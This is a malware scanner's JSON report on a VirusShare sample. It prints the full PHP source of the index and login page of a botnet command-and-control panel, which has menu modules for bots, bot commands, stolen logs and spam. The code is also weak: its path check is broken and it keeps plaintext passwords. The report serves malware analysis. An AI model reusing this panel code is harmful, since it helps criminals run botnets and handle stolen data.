{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "<?php include_once('system/global.php');define('__INDEX__',1);session_set_cookie_params(COOKIE_LIVETIME,SCRIPT_ROOT);session_name('CC');session_start();\nif(!@include_once(FILE_CONFIG))die('Hello!');\nif(isset($_POST['lng']))$_SESSION['lng']=$_POST['lng'];\nelse if(isset($_GET['lng']))$_SESSION['lng']=$_GET['lng'];\nelse if(isset($_COOKIE['lng']))$_SESSION['lng']=$_COOKIE['lng'];\nif(!isset($_SESSION['lng'])||!SafePath($_SESSION['lng'])||!file_exists('system/'.$_SESSION['lng'].'.lng.php'))$_SESSION['lng']=LNG_DEF;\ninclude_once('system/'.$_SESSION['lng'].'.lng.php'); \nif(!isset($_COOKIE['lng'])||$_SESSION['lng']!==$_COOKIE['lng'])setcookie('lng',$_SESSION['lng'],COOKIE_LIVETIME,SCRIPT_ROOT);\nif(!mysql_connect(MYSQL_HOST,MYSQL_USER,MYSQL_PASS)||!mysql_select_db(MYSQL_DB))die(mysql_error());\nif(isset($_GET['m']))\n{\n  //Login\n  if($_GET['m']=='login'&&isset($_POST['l'])&&isset($_POST['p']))\n  {\n    if(isset($_POST['rmb'])&&$_POST['rmb']==1){setcookie('cl',md5($_POST['l']),COOKIE_LIVETIME,SCRIPT_ROOT);setcookie('cp',md5($_POST['p']),COOKIE_LIVETIME,SCRIPT_ROOT);}\n    $_SESSION['login']=$_POST['l'];\n    $_SESSION['pass']=$_POST['p'];\n    Header('Location: '.$_SERVER['PHP_SELF'].'?m=home');\n    die();\n  }\n  //Logout\n  else if($_GET['m']=='logout')ClearSession();\n}\nfunction SafePath($str){return(strstr('/',$str)===FALSE&&strstr('\\\\', $str)===FALSE);}\nfunction ClearSession(){unset($_SESSION['login']);unset($_SESSION['pass']);unset($_SESSION['id']);unset($_COOKIE['cl']);unset($_COOKIE['cp']);setcookie('cl','',COOKIE_LIVETIME,SCRIPT_ROOT);setcookie('cp','',COOKIE_LIVETIME,SCRIPT_ROOT);}\nfunction GetUserData($names){if(($r=mysql_query(\"SELECT $names FROM \".TABLE_USERS.\" WHERE id='\".$_SESSION['id'].\"' LIMIT 1\"))&&mysql_affected_rows()==1&&($m=mysql_fetch_row($r)))return $m;return FALSE;}\nfunction ShowError($mask){global $module;if(isset($_SESSION['errors'][$module])&&$_SESSION['errors'][$module]>0&&defined($mask.$_SESSION['errors'][$module])){print '<center><font class=\"error\">'.constant($mask.$_SESSION['errors'][$module]).'</font></center><br>';$_SESSION['errors'][$module]=0;}}\nfunction ShowOK($mask){global $module;if(isset($_SESSION['oks'][$module])&&$_SESSION['oks'][$module]>0&&defined($mask.$_SESSION['oks'][$module])){print '<center><font class=\"ok\">'.constant($mask.$_SESSION['oks'][$module]).'</font></center><br>';$_SESSION['oks'][$module]=0;}}\nfunction SetError($id){global $module;$_SESSION['errors'][$module]=$id;}\nfunction SetOK($id){global $module;$_SESSION['oks'][$module]=$id;}\nfunction ftime($fmt,$t){return gmdate($fmt,$t);}\nfunction mask2sql($mask){return str_replace(array('%', '_','*','#'),array('\\%', '\\_','%','_'),$mask);}\nfunction vlt($cid){return MODULES&MODULE_LOGS_DB&&PRIV&PRIV_LOGS_DB?'<a href=\"'.$_SERVER['PHP_SELF'].'?m=dblogs&cids='.urlencode($cid).'&today\" target=\"_blank\" class=\"ca\">'.htmlentities($cid).'</a>':'<b>'.htmlentities($cid).'</b>';};\nfunction int2ver($i){return sprintf(\"%u.%u.%u.%u\",($i>>24)&0xFF,($i>>16)&0xFF,($i>>8)&0xFF,$i&0xFF);}\n\n$error = 1; //no logged\nif(isset($_SESSION['login'])&&isset($_SESSION['pass']))$error=(($r=mysql_query(\"SELECT id,priv,login,pass FROM \".TABLE_USERS.\" WHERE login='\".addslashes($_SESSION['login']).\"' AND pass='\".addslashes($_SESSION['pass']).\"' LIMIT 1\"))&&mysql_affected_rows()==1)?0:2;\nif($error!=0&&isset($_COOKIE['cl'])&&$_COOKIE['cl']!=''&&isset($_COOKIE['cp'])&&$_COOKIE['cp']!='')$error=(($r=mysql_query(\"SELECT id,priv,login,pass FROM \".TABLE_USERS.\" WHERE MD5(login)='\".addslashes($_COOKIE['cl']).\"' AND MD5(pass)='\".addslashes($_COOKIE['cp']).\"' LIMIT 1\"))&&mysql_affected_rows()==1)?0:2;\nif($error!=0){$module='login';ClearSession();}\nelse \n{\n  $m=mysql_fetch_row($r);\n  $_SESSION['id']=$m[0];\n  $_SESSION['login']=$m[2];\n  $_SESSION['pass']=$m[3];\n  define('PRIV',$m[1]);\n  $MND=array(0,        LNG_MM_STATS,       PRIV_STATS,                       0,\n             'stats',  LNG_MM_STATS_INFO,  PRIV_STATS,                       0,\n             0,        LNG_MM_BOTNET,      PRIV_BOTS|PRIV_BOTS_CMDS,         MODULE_BOTS|MODULE_BOTS_CMDS,\n             'bots',   LNG_MM_BOTNET_LIST, PRIV_BOTS,                        MODULE_BOTS,\n             'bcmds',  LNG_MM_BOTNET_CMDS, PRIV_BOTS_CMDS,                   MODULE_BOTS_CMDS,\n             0,        LNG_MM_LOGS,        PRIV_LOGS_DB|PRIV_LOGS_DBT,       MODULE_LOGS_DB,\n             'dblogs', LNG_MM_LOGS_DB,     PRIV_LOGS_DB,                     MODULE_LOGS_DB,\n             'dbtlogs',LNG_MM_LOGS_DBT,    PRIV_LOGS_DBT,                    MODULE_LOGS_DB|MODULE_LOGS_TMPS,\n             'lfiles' ,LNG_MM_LOGS_FILES,  PRIV_LOGS_FILES,                  MODULE_LOGS|MODULE_LOGS_FILES,\n             'spam'   ,LNG_MM_SPAMBOT,     PRIV_SPAMBOT,                     MODULE_SPAMBOT,\n             0,        LNG_MM_SYS,         PRIV_USERS|PRIV_OPTIONS|PRIV_USER,MODULE_LOGS|MODULE_BOTS|MODULE_USERS,\n             'users',  LNG_MM_SYS_USERS,   PRIV_USERS,                       MODULE_USERS,\n             'user',   LNG_MM_SYS_USER,    PRIV_USER,                        0,\n             'options',LNG_MM_SYS_OPTIONS, PRIV_OPTIONS,                     MODULE_LOGS|MODULE_BOTS\n             );\n  $MNC=count($MND);\n  $needm=isset($_GET['m'])?$_GET['m']:'';\n  $module='';\n  for($i=0;$i<$MNC;$i+=4)if($MND[$i]!==0&&PRIV&$MND[$i+2]&&($MND[$i+3]==0||MODULES&$MND[$i+3]))\n  {\n    if($needm===$MND[$i]){$module=$MND[$i];break;}\n    if($module=='')$module=$MND[$i];\n  }\n  if($module==''){$module='login';ClearSession();}\n  define('MODULE',$module);\n}\nif(!file_exists('system/'.$_SESSION['lng'].'.'.$module.'.lng.php'))$_SESSION['lng']=LNG_DEF;\ndefine('QUERY_STRING',$_SERVER['PHP_SELF'].'?m='.$module);\ninclude_once('theme/html.php');\ninclude_once('system/'.$_SESSION['lng'].'.'.$module.'.lng.php');\ninclude_once('system/mod.'.$module.'.php'); \n?>"
    },
    "filename": "VirusShare_54d7ea1741c80899088b5297d1d10f92",
    "filesize": 5861,
    "filetype": "PHP script, ASCII text, with very long lines, with CRLF line terminators",
    "hashes": {
        "md5": "54d7ea1741c80899088b5297d1d10f92",
        "sha1": "8f01311288fde657a733444cf5522aac03f93b38",
        "sha256": "23bd683aa4388096a13c33c2cb79f9ba29b89283ed78691db957c3f209c7ee5e"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<?php include_once('system/global.php');define('__INDEX__',1);session_set_cookie_params(COOKIE_LIVETIME,SCRIPT_ROOT);session_name('CC');session_start();",
            "if(!@include_once(FILE_CONFIG))die('Hello!');",
            "if(isset($_POST['lng']))$_SESSION['lng']=$_POST['lng'];",
            "else if(isset($_GET['lng']))$_SESSION['lng']=$_GET['lng'];",
            "else if(isset($_COOKIE['lng']))$_SESSION['lng']=$_COOKIE['lng'];",
            "if(!isset($_SESSION['lng'])||!SafePath($_SESSION['lng'])||!file_exists('system/'.$_SESSION['lng'].'.lng.php'))$_SESSION['lng']=LNG_DEF;",
            "include_once('system/'.$_SESSION['lng'].'.lng.php'); ",
            "if(!isset($_COOKIE['lng'])||$_SESSION['lng']!==$_COOKIE['lng'])setcookie('lng',$_SESSION['lng'],COOKIE_LIVETIME,SCRIPT_ROOT);",
            "if(!mysql_connect(MYSQL_HOST,MYSQL_USER,MYSQL_PASS)||!mysql_select_db(MYSQL_DB))die(mysql_error());",
            "if(isset($_GET['m']))",
            "  //Login",
            "  if($_GET['m']=='login'&&isset($_POST['l'])&&isset($_POST['p']))",
            "    if(isset($_POST['rmb'])&&$_POST['rmb']==1){setcookie('cl',md5($_POST['l']),COOKIE_LIVETIME,SCRIPT_ROOT);setcookie('cp',md5($_POST['p']),COOKIE_LIVETIME,SCRIPT_ROOT);}",
            "    $_SESSION['login']=$_POST['l'];",
            "    $_SESSION['pass']=$_POST['p'];",
            "    Header('Location: '.$_SERVER['PHP_SELF'].'?m=home');",
            "    die();",
            "  //Logout",
            "  else if($_GET['m']=='logout')ClearSession();",
            "function SafePath($str){return(strstr('/',$str)===FALSE&&strstr('\\\\', $str)===FALSE);}",
            "function ClearSession(){unset($_SESSION['login']);unset($_SESSION['pass']);unset($_SESSION['id']);unset($_COOKIE['cl']);unset($_COOKIE['cp']);setcookie('cl','',COOKIE_LIVETIME,SCRIPT_ROOT);setcookie('cp','',COOKIE_LIVETIME,SCRIPT_ROOT);}",
            "function GetUserData($names){if(($r=mysql_query(\"SELECT $names FROM \".TABLE_USERS.\" WHERE id='\".$_SESSION['id'].\"' LIMIT 1\"))&&mysql_affected_rows()==1&&($m=mysql_fetch_row($r)))return $m;return FALSE;}",
            "function ShowError($mask){global $module;if(isset($_SESSION['errors'][$module])&&$_SESSION['errors'][$module]>0&&defined($mask.$_SESSION['errors'][$module])){print '<center><font class=\"error\">'.constant($mask.$_SESSION['errors'][$module]).'</font></center><br>';$_SESSION['errors'][$module]=0;}}",
            "function ShowOK($mask){global $module;if(isset($_SESSION['oks'][$module])&&$_SESSION['oks'][$module]>0&&defined($mask.$_SESSION['oks'][$module])){print '<center><font class=\"ok\">'.constant($mask.$_SESSION['oks'][$module]).'</font></center><br>';$_SESSION['oks'][$module]=0;}}",
            "function SetError($id){global $module;$_SESSION['errors'][$module]=$id;}",
            "function SetOK($id){global $module;$_SESSION['oks'][$module]=$id;}",
            "function ftime($fmt,$t){return gmdate($fmt,$t);}",
            "function mask2sql($mask){return str_replace(array('%', '_','*','#'),array('\\%', '\\_','%','_'),$mask);}",
            "function vlt($cid){return MODULES&MODULE_LOGS_DB&&PRIV&PRIV_LOGS_DB?'<a href=\"'.$_SERVER['PHP_SELF'].'?m=dblogs&cids='.urlencode($cid).'&today\" target=\"_blank\" class=\"ca\">'.htmlentities($cid).'</a>':'<b>'.htmlentities($cid).'</b>';};",
            "function int2ver($i){return sprintf(\"%u.%u.%u.%u\",($i>>24)&0xFF,($i>>16)&0xFF,($i>>8)&0xFF,$i&0xFF);}",
            "$error = 1; //no logged",
            "if(isset($_SESSION['login'])&&isset($_SESSION['pass']))$error=(($r=mysql_query(\"SELECT id,priv,login,pass FROM \".TABLE_USERS.\" WHERE login='\".addslashes($_SESSION['login']).\"' AND pass='\".addslashes($_SESSION['pass']).\"' LIMIT 1\"))&&mysql_affected_rows()==1)?0:2;",
            "if($error!=0&&isset($_COOKIE['cl'])&&$_COOKIE['cl']!=''&&isset($_COOKIE['cp'])&&$_COOKIE['cp']!='')$error=(($r=mysql_query(\"SELECT id,priv,login,pass FROM \".TABLE_USERS.\" WHERE MD5(login)='\".addslashes($_COOKIE['cl']).\"' AND MD5(pass)='\".addslashes($_COOKIE['cp']).\"' LIMIT 1\"))&&mysql_affected_rows()==1)?0:2;",
            "if($error!=0){$module='login';ClearSession();}",
            "else ",
            "  $m=mysql_fetch_row($r);",
            "  $_SESSION['id']=$m[0];",
            "  $_SESSION['login']=$m[2];",
            "  $_SESSION['pass']=$m[3];",
            "  define('PRIV',$m[1]);",
            "  $MND=array(0,        LNG_MM_STATS,       PRIV_STATS,                       0,",
            "             'stats',  LNG_MM_STATS_INFO,  PRIV_STATS,                       0,",
            "             0,        LNG_MM_BOTNET,      PRIV_BOTS|PRIV_BOTS_CMDS,         MODULE_BOTS|MODULE_BOTS_CMDS,",
            "             'bots',   LNG_MM_BOTNET_LIST, PRIV_BOTS,                        MODULE_BOTS,",
            "             'bcmds',  LNG_MM_BOTNET_CMDS, PRIV_BOTS_CMDS,                   MODULE_BOTS_CMDS,",
            "             0,        LNG_MM_LOGS,        PRIV_LOGS_DB|PRIV_LOGS_DBT,       MODULE_LOGS_DB,",
            "             'dblogs', LNG_MM_LOGS_DB,     PRIV_LOGS_DB,                     MODULE_LOGS_DB,",
            "             'dbtlogs',LNG_MM_LOGS_DBT,    PRIV_LOGS_DBT,                    MODULE_LOGS_DB|MODULE_LOGS_TMPS,",
            "             'lfiles' ,LNG_MM_LOGS_FILES,  PRIV_LOGS_FILES,                  MODULE_LOGS|MODULE_LOGS_FILES,",
            "             'spam'   ,LNG_MM_SPAMBOT,     PRIV_SPAMBOT,                     MODULE_SPAMBOT,",
            "             0,        LNG_MM_SYS,         PRIV_USERS|PRIV_OPTIONS|PRIV_USER,MODULE_LOGS|MODULE_BOTS|MODULE_USERS,",
            "             'users',  LNG_MM_SYS_USERS,   PRIV_USERS,                       MODULE_USERS,",
            "             'user',   LNG_MM_SYS_USER,    PRIV_USER,                        0,",
            "             'options',LNG_MM_SYS_OPTIONS, PRIV_OPTIONS,                     MODULE_LOGS|MODULE_BOTS",
            "             );",
            "  $MNC=count($MND);",
            "  $needm=isset($_GET['m'])?$_GET['m']:'';",
            "  $module='';",
            "  for($i=0;$i<$MNC;$i+=4)if($MND[$i]!==0&&PRIV&$MND[$i+2]&&($MND[$i+3]==0||MODULES&$MND[$i+3]))",
            "    if($needm===$MND[$i]){$module=$MND[$i];break;}",
            "    if($module=='')$module=$MND[$i];",
            "  if($module==''){$module='login';ClearSession();}",
            "  define('MODULE',$module);",
            "if(!file_exists('system/'.$_SESSION['lng'].'.'.$module.'.lng.php'))$_SESSION['lng']=LNG_DEF;",
            "define('QUERY_STRING',$_SERVER['PHP_SELF'].'?m='.$module);",
            "include_once('theme/html.php');",
            "include_once('system/'.$_SESSION['lng'].'.'.$module.'.lng.php');",
            "include_once('system/mod.'.$module.'.php'); "
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.325981",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
